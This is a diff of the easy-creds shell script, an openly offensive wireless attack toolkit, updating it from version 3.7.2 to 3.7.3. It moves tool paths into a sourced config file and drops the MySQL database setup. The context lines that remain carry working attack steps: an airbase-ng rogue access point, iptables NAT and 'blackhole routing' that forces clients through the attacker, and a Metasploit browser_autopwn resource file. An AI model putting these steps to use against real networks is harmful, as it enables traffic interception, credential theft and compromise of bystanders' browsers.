@@ -5,7 +5,7 @@
 #                                                                                                                #
 # J0hnnyBrav0 (@Brav0hax) & help from al14s (@al14s)                                                             #
 ##################################################################################################################
-# v3.7.2 Garden of Your Mind - 11/20/2012
+# v3.7.3 Garden of Your Mind - 12/11/2012
 #
 # Copyright (C) 2012  Eric Milam
 # This program is free software; you can redistribute it and/or modify it under the terms of the GNU General Public 
@@ -19,7 +19,6 @@
 ##################################################################################################################
 #
 #Clear some variables
-unset msfmysql
 unset wireless
 unset etterlaunch
 unset offset
@@ -72,70 +71,11 @@ fi
 
 ##################################################
 f_findpaths(){
-	
-# You have 2 options here. easy-creds can use 'locate' to attempt to find the proper executables, or you can declare them statically.
-# I originally used the locate function, but I found it a bit clumsy, so declaring a direct path would be best.
-
-#To have easy-creds do a 'locate' uncomment the block below and comment out the block of code with static paths
-# Variable Path Lookups
-#	ecpath=$(locate easy-creds.sh | sed 's,/*[^/]\+/*$,,')
-#	ferretpath=$(locate -b '\ferret'| sed 's,/*[^/]\+/*$,,')
-#	airodumppath=$(locate -b '\airodump-ng'| sed 's,/*[^/]\+/*$,,')
-#	locate -b '\airbase-ng' > /tmp/ec/airbase.check
-#	for i in $(cat /tmp/ec/airbase.check); do
-#	 if [ ! -d $i ] && [ -x $i ]; then
-#	  airbasepath=$($i | sed 's,/*[^/]\+/*$,,')
-#	 fi
-#	done
-#	hamsterpath=$(locate -b '\hamster.js' | sed 's,/*[^/]\+/*$,,')
-#	locate -b '\aircrack-ng' > /tmp/ec/aircrack.check
-#	for i in $(cat /tmp/ec/aircrack.check); do
-#	 if [ ! -d $i ] && [ -x $i ]; then
-#	  aircrackpath=$($i | sed 's,/*[^/]\+/*$,,')
-#	 fi
-#	done
-#
-#	pathtoradiusd=$(locate -b -l 1 '\radiusd' | sed 's,/*[^/]\+/*$,,')
-#	pathtoradiusconf=$(locate -b -l 1 '\radiusd.conf' | sed 's,/*[^/]\+/*$,,')
-#
-#	if [ ! -e /usr/sbin/hostapd ]; then
-#	 locate -b '\hostapd' | sed 's,/*[^/]\+/*$,,' > /tmp/ec/hostapd.find
-#	  while [ ! -d $pathtohostapd ] && [ -x $pathtohostapd ]; do
-#	  for i in $(cat /tmp/ec/hostapd.find); do
-#	   pathtohostapd=$i
-#	  done
-#	 done
-#	else
-#	 pathtohostapd=/usr/sbin
-#	fi
-#
-#	 findradiuslog=$(locate  -b 'radius.log' | sed 's,/*[^/]\+/*$,,')
-#
-#	if [ ! -e "/usr/bin/asleap" ]; then
-#		asleappath=$(locate -l 1 -b "\asleap"|sed 's,/*[^/]\+/*$,,')
-#	else
-#		asleappath=/usr/bin
-#	fi
-########
-#
-#Static Path Declarations <- Much easier ;-)
-	airbasepath="/usr/local/sbin"
-	aircrackpath="/usr/local/bin"
-	airodumppath="/usr/local/sbin"
-	asleappath="/usr/bin/"
-	ecpath="/pentest/sniffers/easy-creds"
-	etterpath="/usr/local/bin"
-	ferretpath="/usr/bin"
-	freeradiuslog="/usr/local/var/log/radius/freeradius-server-wpe.log"
-	hamsterpath="/opt/sidejack"
-	mdk3path="/usr/local/sbin"
-	pathtohostapd="/usr/sbin"
-	pathtoradiusd="/usr/local/sbin"
-	pathtoradiusconf="/usr/local/etc/raddb"
-	sslstrippath="/pentest/web/sslstrip"
-########
+# Grab the paths from the config file
+updatedb &> /dev/null
+easy_creds_config=$(locate easy-creds.paths)
+source $easy_creds_config	
 }
-
 
 ##################################################
 f_xtermwindows(){
@@ -182,10 +122,6 @@ f_Quit(){
 	fi
 
 	echo "0" > /proc/sys/net/ipv4/ip_forward
-
-	if [ ! -z $msfmysql ] ; then
-	  service mysql stop &> /dev/null
-	fi
 
 	if [ ! -z $dosattack ] ; then
 	  airmon-ng stop $dosmon &> /dev/null
@@ -1184,18 +1120,6 @@ f_karmadhcp(){
 
 ##################################################
 f_karmasetup(){
-	msfmysql=1
-
-	read -p "Enter the password for the mysql root user [toor]: " MYSPWD
-	if [ -z $MYSPWD ]; then MYSPWD=toor; fi
-
-	read -p "Enter the listening port for the mysql server [3306] : " MYSPORT
-	if [ -z $MYSPORT ]; then MYSPORT=3306; fi
-
-	service mysql start &> /dev/null
-
-	echo "db_driver mysql" > /tmp/ec/karma.rc
-	echo "db_connect root:$MYSPWD@127.0.0.1:$MYSPORT/msfbook" >> /tmp/ec/karma.rc
 	echo "use auxiliary/server/browser_autopwn" >> /tmp/ec/karma.rc
 	echo "setg AUTOPWN_HOST $ATIP" >> /tmp/ec/karma.rc
 	echo "setg AUTOPWN_PORT 55550" >> /tmp/ec/karma.rc
@@ -1269,20 +1193,23 @@ f_karmafinal(){
 	 xterm -geometry "$width"x$height-$x+$y -T "Airbase-NG" -e airbase-ng -P -C 60 -e "default" $MONMODE &
 	fi
 	echo $! > /tmp/ec/ec-karma-pid
+	sleep 7
 
 	echo -e "\n\e[1;33m[*] Configuring tunneled interface.\e[0m"
 	ifconfig $TUNIFACE up
 	ifconfig $TUNIFACE $ATIP netmask $ATSUB
 	ifconfig $TUNIFACE mtu 1400
 	route add -net $ATNET netmask $ATSUB gw $ATIP dev $TUNIFACE
+	sleep 3
 
-	echo -e "\nSetting up iptables to handle traffic seen by the tunneled interface."
+	echo -e "\n\e[1;33m[*] Setting up iptables to handle traffic seen by the tunneled interface.\e[0m"
 	iptables --flush
 	iptables --table nat --flush
 	iptables --delete-chain
 	iptables --table nat --delete-chain
 	iptables -P FORWARD ACCEPT
 	iptables -t nat -A POSTROUTING -o $IFACE -j MASQUERADE
+	sleep 3
 
 	#Blackhole Routing - Forces clients to go through attacker even if they have cached DNS entries
 	iptables -t nat -A PREROUTING -i $TUNIFACE -j REDIRECT
@@ -1305,6 +1232,7 @@ f_karmafinal(){
 	else
 		service dhcpd start
 	fi
+	sleep 3
 
 	if [ -z $isxrunning ]; then
 	 echo -e "\n\e[1;33m[*] Launching Karmetasploit in screen. Once it loads press ctrl-a then d return to this window.\e[0m\n"
@@ -1634,7 +1562,7 @@ f_Banner(){
 	echo -e "||\e[1;36me\e[0m |||\e[1;36ma\e[0m |||\e[1;36ms\e[0m |||\e[1;36my\e[0m |||\e[1;36m-\e[0m |||\e[1;36mc\e[0m |||\e[1;36mr\e[0m |||\e[1;36me\e[0m |||\e[1;36md\e[0m |||\e[1;36ms\e[0m ||"
 	echo -e "||__|||__|||__|||__|||__|||__|||__|||__|||__|||__||"
 	echo -e "|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|/__\|"
-	echo -e "\e[1;33m 	Version 3.7.2 - Garden of Your Mind\e[0m"
+	echo -e "\e[1;33m 	Version 3.7.3 - Garden of Your Mind\e[0m"
 	echo
 	echo -e "\e[1;33mAt any time,\e[0m \e[1;36mctrl+c\e[0m \e[1;33m to cancel and return to the main menu\e[0m"
 	echo
